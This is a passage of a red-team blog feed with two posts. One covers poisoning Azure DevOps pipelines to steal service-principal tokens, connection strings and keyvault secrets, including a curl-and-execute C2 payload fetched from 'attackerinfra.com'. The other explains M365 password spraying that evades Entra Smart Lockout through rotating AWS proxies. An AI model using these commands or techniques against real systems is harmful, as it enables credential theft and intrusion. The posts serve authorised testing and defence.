&lt;p&gt;If you find yourself in a position where you can push code to a pipeline, you are now in a position to poison it. Remember, pipeline running agents execute arbitrary &lt;em&gt;user-supplied code.&lt;/em&gt; That smells like RCE to me! Note, pushing arbitrary code to operational pipelines is not the play here. Instead, try to create your own branch or look for test branches. Always clear this with the client before proceeding! It’s important that we stress this point because at this stage you will need to proceed with extra caution as you may be interfering with production services. So please, if you are on an engagement, ensure you gain the right authorisation from the target organisation before proceeding with creating branches or applying changes to the pipeline environment.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;⚠️  &lt;em&gt;always ensure you gain the right authorisation from the target organisation before proceeding with creating branches or applying changes to the pipeline environment&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Where you go from here is limited only by your creativity. In our case, we use these RCEs to reach out to attacker-controlled infrastructure and pull down a C2 implant suitable for the target architecture. As a bonus, these machines rarely have security products on them as they are ephemeral by nature (we’ll get to how to maintain persistent access to these machines later)&lt;/p&gt;
&lt;p&gt;Now this may start to feel more like a traditional red team, but unlike a traditional red team your focus should be on compromising the identity of that agent. That is to say, you can try to steal the pipeline agent’s identity used by Azure, or any other cloud provider for that matter. These will often have service principal identities associated with them in Azure to perform actions.&lt;/p&gt;
&lt;p&gt;Some options with regards to stealing the tokens include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Requesting the tokens using az cli (from the perspective of the code agent).&lt;/li&gt;
&lt;li&gt;Metadata service&lt;/li&gt;
&lt;li&gt;Environment variables&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The above can be achieved by either entering the code in the code commit or by obtaining a reverse shell from the ephemeral virtual environment used by the code running agent.&lt;/p&gt;
&lt;p&gt;Having now compromised that service principal, it should be easy to review whether they have read/write permissions over other services in Azure resource manager (ARM).&lt;/p&gt;
&lt;p&gt;To summarise, if you can write to the repository code that is run by the code running agents, you can leverage the agent’s service principal identity to enumerate resources within the Azure environment as them, and mostly undetected.&lt;/p&gt;
&lt;p&gt;If this works, it would effectively mean pivoting from your initial Azure user identity to a service principal identity for lateral movement.&lt;/p&gt;
&lt;p&gt;Now what do you do? Well, below we will explore different options here such as automating the process of discovering assets like storage accounts, keyvaults, CosmosDB databases, and so on.&lt;/p&gt;
&lt;h3&gt;The path to El-Dorado&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-path-to-el-dorado&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-path-to-el-dorado&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Having now compromised the identity associated with a code checking agent you can start looking for ways to escalate privileges, move laterally or demonstrate business impact. My favourite approach would be to steal credentials and connection strings to find a route to more business critical environments.&lt;/p&gt;
&lt;p&gt;In previous engagements we have used this to retrieve:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Access and Refresh Tokens.&lt;/li&gt;
&lt;li&gt;Environmental variables belonging to the code build running agent.&lt;/li&gt;
&lt;li&gt;Storage Account connection strings.&lt;/li&gt;
&lt;li&gt;CosmosDB and Mongo databases and their connection strings.&lt;/li&gt;
&lt;li&gt;Keyvaults and the secrets they stored.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Wondering what this might look like in real terms? The following are some code examples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Enumerate the service principal account and fetch tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;az account list
echo &amp;#34;----Collecting Tokens-----&amp;#34;
echo token
az account get-access-token
echo aadgraphtoken
az account get-access-token --resource-type aad-graph
echo armtoken
az account get-access-token --resource-type arm
echo batchtoken
az account get-access-token --resource-type batch
echo datalake token
az account get-access-token --resource-type data-lake
echo ms-graphtoken
az account get-access-token --resource-type ms-graph&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And the above list can continue with pretty much any Azure cloud enumeration command you can think of afterwards…obviously, you can also install new tools and execute them in this context.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Iterate through resources to fetch their connection strings to be used with Azure Storage Explorer or Azure Data Studio.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Ensure you install jq with sudo apt install jq -y
# Find storage accounts
az storage account list | jq &amp;#34;.[].name&amp;#34; | awk &amp;#34;{print $1}&amp;#34; | xargs -I % sh -c &amp;#34;{ az storage account show-connection-string -n %; sleep 7;}&amp;#34; | jq &amp;#34;.connectionString&amp;#34;

#Find cosmosdb
az cosmosdb list | jq &amp;#34;.[].name&amp;#34; | awk &amp;#34;{print $1}&amp;#34; | xargs -I % sh -c &amp;#34;{ az cosmosdb list-connection-strings -n % --resource-group ; sleep 7;}&amp;#34; | jq &amp;#34;.connectionString&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Enumerate and fetch secrets from keyvaults.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Show secrets names
az keyvault secret list --include-managed --vault-name &amp;#34;vault-name&amp;#34; --maxresults 25

# Show secrets&amp;#39;secret values :)
az keyvault secret show --vault-name vault-name --name &amp;#34;secrets-name&amp;#34; | jq &amp;#39;.value&amp;#39; | tr -d &amp;#39;&amp;#34;&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Download and execute malware, and sleep indefinitely to ensure the beacon is not killed. This is how you can maintain persistent access to an otherwise ephemeral box.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# Fetch the payload from attackerinfra.com
curl -k -X $&amp;#39;GET&amp;#39; \
-H $&amp;#39;Host: attackerinfra.com&amp;#39; -H $&amp;#39;Sec-Ch-Ua: \
&amp;#34;Not A(Brand\&amp;#34;;v=\&amp;#34;24\&amp;#34;, \&amp;#34;Chromium\&amp;#34;;v=\&amp;#34;110\&amp;#34;&amp;#39; -H $&amp;#39;Sec-Ch-Ua-Mobile: ?0&amp;#39; -H $&amp;#39;Upgrade-Insecure-Requests: 1&amp;#39; [...] -H $&amp;#39;Connection: close&amp;#39; \
$&amp;#39;https://attackerinfra.com/MailDriverIntegration&amp;#39; &amp;gt; /home/agentuser/MailDriverIntegration

# Execute the malware
chmod &amp;#43;x /home/agentuser/MailDriverIntegration
sudo /home/agentuser/MailDriverIntegration &amp;amp; disown

# Sleep indefinitely
while [ 1 ]; do sleep 3; echo &amp;#34;test&amp;#34;; done;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;In the past, these commands and techniques have given us unfettered access to a plethora of information and data. At times, this was sensitive business data that could demonstrate that damage could be done even with non-dev accounts in the cloud, which are usually less protected for ease of access. Clearly, this is a reason to extend security best practices to all the departments in an organisation.&lt;/p&gt;
&lt;h3&gt;The man in the high castle&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-man-in-the-high-castle&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-man-in-the-high-castle&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;By now you should hopefully have a decent amount of data, tokens and files to sift through (if not make sure you’ve looked through all accessible storage accounts). Some of the most juicy files you may find in DevOps environments are .tf files. These may be more common than you might expect as DevOps engineers and developers often make use of Terraform and Infrastructure as Code (IaC). If you come across these in your cloud red teaming engagement, you may have hit the jackpot.&lt;/p&gt;
&lt;p&gt;For those not familiar with these files, they contain the configuration and state information for infrastructure managed by Terraform, a popular infrastructure as code (IaC) tool, often used in DevOps. Terraform uses these state files to keep track of the infrastructure it manages, ensuring that it can update or delete resources automatically. This data is crucial as it includes sensitive information such as configuration details, encryption keys, API keys, and possibly credentials that are needed to manage the infrastructure components.&lt;/p&gt;
&lt;p&gt;Essentially, these files are a blueprint of the entire infrastructure&amp;rsquo;s architecture and contain all the necessary details to replicate or manipulate the environment. The exploration of such cloud storage can lead to the retrieval of service account credentials used to push code  to sometimes critical environments (i.e. &lt;strong&gt;&lt;em&gt;production&lt;/em&gt;&lt;/strong&gt;).&lt;/p&gt;
&lt;p&gt;Once you are able to steal a higher privileged set of credentials (double points if it was a service principal), you can consider re-running the same techniques as mentioned before to access new and more critical assets.&lt;/p&gt;
&lt;p&gt;Leveraging the above techniques in client environments we have succeeded in completing attack paths that have led from non-technical staff being able to move laterally and escalate privileges all the way to being able to push code to the production CI/CD pipeline! This would effectively represent a significant vantage point and positioning for a malicious actor, who can carry out disruptive attacks that may halt business operations, deny services to employees and customers, exfiltrate valuable intellectual property and possibly wipe off or alter any data in Azure for extortion purposes.&lt;/p&gt;
&lt;h3&gt;Lessons learned&lt;span class=&#34;absolute -mt-20&#34; id=&#34;lessons-learned&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#lessons-learned&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The fascinating exploration of the cloud world and its wonders serves as a reminder to us all of the necessity of striking a balance between the convenience of cloud adoption and the critical need for robust security practices. Some observations and takeaways stemming from our experience are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;If possible, restrict commit history and code deployment logs read access to administrators only when using Azure DevOps.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Limit code access in your pipeline to authorised devs only, who can read, write, pull, and push. Keeping an eye on access roles, especially for project manager accounts or non-techie accounts (usually lacking MFA, and generally less protected than devs’ accounts), is crucial for maintaining operational integrity and preventing abuses.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Implement granular firewall and access control rules (RBAC) at the resource group level to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;enforce strict separation of the SDLC environments.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;restrict access to resources (storage accounts, key vaults, and databases) to only authorised users, machines and/or IP addresses.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Protect your &lt;em&gt;tfstate&lt;/em&gt; files as if they were passwords! Credentials and connection strings can easily lay in there!&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Review if service principals are adhering to the policy of least privileged access, even for seemingly benign ephemeral code checking agents.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Always consider defence-in-depth and integrating security to your DevOps processes and environments.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you got here, thank you for reading and I hope this inspired you to look after your cloud DevOps environment a bit more thoroughly! :)&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Why sneak when you can walk through the front door - A Love letter to Password Spraying against M365 in Red Team Engagements</title>
      <link>//localhost:1313/articles/2024/05/2024-05-02-why-sneak-when-you-can-walk-through-the-front-door/</link>
      <pubDate>Thu, 02 May 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/05/2024-05-02-why-sneak-when-you-can-walk-through-the-front-door/</guid>
      <description>
        
        
        &lt;p&gt;In 2023 through 2024, JUMPSEC&amp;rsquo;s red team gained access to Microsft 365 (M365) environments of sophisticated clients during adversarial engagements with an approach that breathes life into the decades-old technique of password spraying. With threat actors increasingly using similar approaches in the wild, being able to compromise the even likes of &lt;em&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Microsoft themselves&lt;/a&gt;&lt;/em&gt;, it is my opinion that red teams might benefit from incorporating some of these techniques into their initial access arsenal, or even in external perimeter security testing, to better emulate adversaries and challenge assumptions around intial access.&lt;/p&gt;
&lt;h2&gt;Credit&lt;span class=&#34;absolute -mt-20&#34; id=&#34;credit&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#credit&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Full credit needs to be given to developers of the tools and authors of the following blog posts who kindly shared their ideas. This post is heavily inspired by the work of:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://www.trustedsec.com/blog/teamfiltration-v3-5-0-improve-all-the-things&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Teamfiltration v 3.5.3, initial v1 released in DEFCON 2022&lt;/a&gt;&lt;/em&gt; - Credits to Flangvik @ TrustedSec&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;//github.com/ustayready/fireprox&#34; &gt;&lt;em&gt;Fireprox, initial release in 2019&lt;/em&gt;&lt;/a&gt; - Credits to ustrayready @ Black Hills InfoSec&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://www.blackhillsinfosec.com/introducing-graphrunner/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Graphrunner, initial release in Oct 2023&lt;/a&gt;&lt;/em&gt; - Credits to dafthack @ Black Hills InfoSec&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Why M365?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;why-m365&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#why-m365&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Historically, Outlook accounts were &lt;em&gt;merely&lt;/em&gt; email inboxes with impactful but limited usability, but this is no longer the case. Barring the capacity to read sensitive businesss communications and impersonate internal users to phish others in an organisation, an attacker&amp;rsquo;s access to M365 accounts often lead to far more impact in hybrid or cloud-native organisations in 2024.&lt;/p&gt;
&lt;p&gt;For example, we have multiple clients where most if not all of their business critical data now resides in SharePoint and access control is tied to M365/Azure groups. An attacker compromising an account with SharePoint access is analogous to getting access to the data of an internal file server in a traditional on-prem context. Let&amp;rsquo;s say said account has read/write access to multiple business-critical SharePoint sites, then they are already analogous to being able to &amp;ldquo;deploy ransomware&amp;rdquo; in a traditional sense, if proper recovery procedures have not been implemented.&lt;/p&gt;
&lt;p&gt;In addition, an active M365 session grants access to GraphAPI and other Microsoft cloud resources, which is a fantastic entrypoint for lateral movement and persistence in the cloud. I do encourage checking out Black Hill&amp;rsquo;s incredible &lt;em&gt;&lt;a href=&#34;https://www.blackhillsinfosec.com/introducing-graphrunner/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;blog post&lt;/a&gt;&lt;/em&gt; on the subject of Azure / GraphAPI lateral movement with GraphRunner if you are interested.&lt;/p&gt;
&lt;h2&gt;The Theory Behind&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-theory-behind&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-theory-behind&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;User&amp;rsquo;s gonna user&lt;span class=&#34;absolute -mt-20&#34; id=&#34;users-gonna-user&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#users-gonna-user&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So, given M365 accounts are juicy targets, how does one gain access? Besides MiTM phishing with tools like Evilginx, consider spraying your way in. The term &amp;ldquo;password spraying&amp;rdquo; refers to trying a small set of passwords (usually less than 20, or even 10 in this context) against a large number (hundreds, or more if possible) of users.&lt;/p&gt;
&lt;p&gt;The core idea is that even in an org with a &amp;ldquo;strong&amp;rdquo; password policy in length and complexity, some users are statistically likely to set easily guessable ones like &lt;code&gt;Welcome@2024&lt;/code&gt;. If an attacker can gather a large number of valid user emails (out of scope of this blog post, but there are many resources for this), they only need to target the statistically common passwords to get the highest chance to find a correct combination.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As a side note, Welcome@YYYY, Season@YYYY, WelcomeYYYY!, Orgname@YYYY appear to be some of the highest hit rate passwords we observed in engagements.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;While this is all well and good, there are 2 minor inconveniences in most modern OAuth providers in the forms of:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;intruder identification &amp;amp; blocking, and;&lt;/li&gt;
&lt;li&gt;user lockout.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Since we are targeting M365, we&amp;rsquo;ll discuss Microsoft&amp;rsquo;s implementation, &lt;strong&gt;Entra Smart Lockout&lt;/strong&gt;, which might surprise you.&lt;/p&gt;
&lt;h3&gt;Entra Smart Lockout&lt;span class=&#34;absolute -mt-20&#34; id=&#34;entra-smart-lockout&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#entra-smart-lockout&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;According to this &lt;em&gt;&lt;a href=&#34;https://techcommunity.microsoft.com/t5/microsoft-entra-blog/azure-ad-password-protection-and-smart-lockout-are-now-in-public/ba-p/245423&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MS announcement&lt;/a&gt;&lt;/em&gt;, Smart Lockout is included in all versions of Azure AD (now called Entra ID, probably a different name in 2025?) including implementations in Office365, by default. Customisatiion of Smart Lockout settings &lt;em&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;requires Microsoft Entra ID P1 license or above&lt;/a&gt;&lt;/em&gt; (Licenses below P1 are stuck with default settings but Smark Lockout is still enabled). Therefore, all M365 corporate clients you encounter should have this feature turned on, and the only variation to expected would be the lockout settings.&lt;/p&gt;
&lt;p&gt;The default settings are as the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(For non-US government tenants): an account is locked after 10 failed attempts.&lt;/li&gt;
&lt;li&gt;The account locks again after each subsequent failed sign-in attempt.&lt;/li&gt;
&lt;li&gt;Lockout period is one minute at first, and longer in subsequent attempts. Microsoft does not disclose the rate at which the lockout period increases after unsuccessful sign-in attempts.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You might be thinking, where&amp;rsquo;s the smart in this, seems to merely be an incremental lockout timer, no? Here&amp;rsquo;s the &lt;em&gt;smart&lt;/em&gt; part:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;When smart lockout locks a user account, we try our best to not lock out the genuine user. To ensure that bad actors can&amp;rsquo;t gain access to a genuine user account. The following considerations apply:&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Familiar vs unfamiliar locations are used to differentiate between a bad actor and the genuine user. They have separate lockout counters.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Once an account is locked out, the lockout state is synchronised across all Microsoft Entra data centers.&lt;/li&gt;
&lt;li&gt;After an account lockout, the user can initiate self-service password reset (SSPR) to sign in again.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And there&amp;rsquo;s the fine print at the end:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In addition to Smart lockout, our default protection analyses and identifies other signals including IP traffic and anomalous behavior. Entra ID blocks these malicious sign-ins by default and returns &lt;em&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AADSTS50053 - IdsLocked error code&lt;/a&gt;&lt;/em&gt;, regardless of the password validity.&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3&gt;TL;DR as in, sorry I didn&amp;rsquo;t read the Doc&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tldr-as-in-sorry-i-didnt-read-the-doc&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#tldr-as-in-sorry-i-didnt-read-the-doc&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;From the Microsoft Documentations we can infer a few things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We need to bypass the lockout timer by spacing out attempts. &lt;em&gt;If attempts for the same user are sufficiently spaced out, the lockout timer (meaning, you won&amp;rsquo;t get in even with a correct password) might not hit you, the attacker&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;The attempts should come from different IP addresses, with minimal behavioral patterns that can be identified by Microsoft&amp;rsquo;s algos.&lt;/li&gt;
&lt;li&gt;Unfortunately, unless our attempts come from the same city or region that the user usually logs into, their daily work routine would not reset our &amp;ldquo;unfamiliar&amp;rdquo; lockout counter.&lt;/li&gt;
&lt;li&gt;The AADESTS50053 error can either mean Smart Lockout kicking in, locking the user account, or default protection. Nevertheless, it means we won&amp;rsquo;t get in with the correct password. That being said, &lt;em&gt;MS have an undisclosed internal timer that would reset in the latter case, or the user can unlock themselves via SSPR, so it might not be the end of the world when you see this error.&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;As said, if SSPR is on, users can unlock themselves, resulting in less disruption to the client. It is not a &amp;ldquo;get out of jail free&amp;rdquo; card though, as locking a single account may be extremely impactful if it&amp;rsquo;s the wrong one. We cannot overstate the importance of getting a good understanding of offensive toolings that you&amp;rsquo;re using, and having clear and open communcations with your client regarding some of these more &amp;ldquo;risky&amp;rdquo; tradecraft.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Fireprox&lt;span class=&#34;absolute -mt-20&#34; id=&#34;fireprox&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#fireprox&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;While APT Midnight Blizzard was reported &lt;em&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;obtain intial access on Microsoft using distributed residential proxies&lt;/a&gt;&lt;/em&gt; to perform password spraying, red teamers can achieve a similar result by utilising the AWS API gateway service, which can (by design) serve as a proxied gateway to … API services (duh). &lt;em&gt;&lt;a href=&#34;https://github.com/ustayready/fireprox&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Fireprox&lt;/a&gt;&lt;/em&gt; is a tool that creates a wrapper around the usage of this service to create a &amp;ldquo;distributed&amp;rdquo; proxy to send POST requests to login.microsoftonline.com. The next tool introduced in this blog post, Teamfiltration, also incorporates code from Fireprox in its codebase, so if you want to follow along, make sure to sort out the AWS pre-requisites here. You&amp;rsquo;d need:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An AWS tenant that you control.&lt;/li&gt;
&lt;li&gt;Create a new IAM user, grant them &lt;code&gt;AmazonAPIGatewayAdministrator&lt;/code&gt; privileges by attaching the policy directly in permissions. Create an access key in &amp;ldquo;Security credentials&amp;rdquo;, choose &amp;ldquo;other&amp;rdquo;, and save the access key ID and secret key somewhere safe.&lt;/li&gt;
&lt;li&gt;(Optionally) Play with Fireprox to figure out what it does.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Basically, how Fireprox works is that you generate a static AWS URL to access an endpoint through AWS&amp;rsquo;s proxy. What makes it interesting is that a different egress IP address is used whenever a new request is made through that generated URL.&lt;/p&gt;
&lt;p&gt;For example, here we created a URL starting with &amp;ldquo;hudi24ri47&amp;rdquo; that is located in the region of us-east-1, and the target is ifconfig.me. By curl-ing repeatedly, we can see the egress IP observed by the target web server is different in every single request.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic2.png&#34; title=&#34;pic2&#34; alt=&#34;pic2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic1.png&#34; title=&#34;pic1&#34; alt=&#34;pic1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you are concerned about costs, API gateway is billed at 100k+ API calls for single digit dollars, so volume generated from engagements, which are usually around 10k requests, never amounted to more than a couple of pennies for us.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Obviously Microsoft would see that the logins come from AWS IP addresses, but that alone has not been enough to trigger lockouts. There are also AWS specific headers that are forwarded or added by the proxy, most importantly the &lt;code&gt;X-Amz-Forwarded-For&lt;/code&gt; header which is removed by Fireprox. You can easily verify this by using your own request catcher and curl with Fireprox and compare the requests received with those sent from vanilla API gateway proxies.&lt;/p&gt;
&lt;h2&gt;Caveats &amp;amp; Disclaimers&lt;span class=&#34;absolute -mt-20&#34; id=&#34;caveats--disclaimers&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#caveats--disclaimers&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Before we discuss the actual tradecraft, do note that you should seek explicit consent from your client before starting any password spraying, and preferrably start from a small user set to minimize disruption. Even if users can self-serve reset their password to unlock their accounts, locking up dozens or even hundreds of accounts, especially without your client&amp;rsquo;s prior knowledge and consent, is professionally unacceptable and the sort of thing that red teamers should avoid at all cost.&lt;/p&gt;
&lt;p&gt;To be absolutely certain about your methodology, spin up your own free (1 month trial) M365 tenant with a number of users to test your methodology before using it on real engagements, as Smart Lockout is enabled by default for all M365 tenants. In fact, when our own red team first dipped our toes into learning this, we started slow and with a lot of anxiety, even with this knowledge and clear communications with our clients. It was over the process of several engagements that we&amp;rsquo;ve learned in depth about how the tooling worked, the thresholds, and so on, that we are finally comfortable recommending it. Bear in mind that locking out accounts on engagements is no laughing matter, and that there is an expectation of professionalism from clients when they purchase a red team.&lt;/p&gt;
&lt;p&gt;Another thing to recommend is to have clear communications with the client regarding what hours the password spraying occur, as some clients do not want out-of-hour password spraying. A spray in our engagements usually takes 2-3 days to complete with Teamfiltration, depending how many passwords/users we can/want to try. Fortunately it can be paused and restarted at any point.&lt;/p&gt;
